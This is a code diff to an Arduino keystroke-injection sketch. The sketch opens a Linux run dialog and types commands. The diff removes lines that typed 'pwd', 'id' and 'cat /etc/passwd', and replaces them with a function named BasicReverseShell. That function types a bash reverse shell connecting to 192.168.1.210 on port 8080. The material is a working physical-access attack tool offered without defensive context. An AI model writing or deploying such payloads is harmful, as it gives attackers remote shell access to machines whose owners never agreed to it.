@@ -13,7 +13,7 @@ void HelloWorld_Gnome() {
   Keyboard.print("Hello World!!!");
 }
 
-void BasicTerminalCommands() {
+void BasicReverseShell() {
   Keyboard.press(KEY_LEFT_ALT);
   Keyboard.press(KEY_F2);
   delay(100);
@@ -25,9 +25,5 @@ void BasicTerminalCommands() {
   delay(100);
   Keyboard.releaseAll();
   delay(3000);
-  Keyboard.println("pwd");
-  delay(1000);
-  Keyboard.println("id");
-  delay(1000);
-  Keyboard.println("cat /etc/passwd");
+  Keyboard.println("bash -i >& /dev/tcp/192.168.1.210/8080 0>&1");
 }
